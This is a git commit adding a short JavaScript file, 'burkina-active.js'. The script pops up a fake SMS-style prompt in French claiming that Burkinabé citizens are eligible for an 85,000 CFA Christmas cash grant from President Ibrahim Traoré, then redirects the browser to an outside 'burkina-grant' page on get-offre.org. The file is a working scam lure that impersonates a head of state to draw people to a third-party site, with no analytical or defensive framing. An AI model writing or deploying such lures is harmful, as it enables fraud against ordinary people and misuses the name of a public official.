88239de832e4c53f1949ce82e402442d507c14d4
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-27 10:18:32 -0800

    Create burkina-active.js

---
+++ burkina-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 85 000CFA'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000CFA du Président Ibrahim Traoré pour les Burkinabé. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000CFA');
+if (password != 'RETIRER 85 000CFA') {
+location.href='https://get-offre.org/burkina-grant.html';
+}
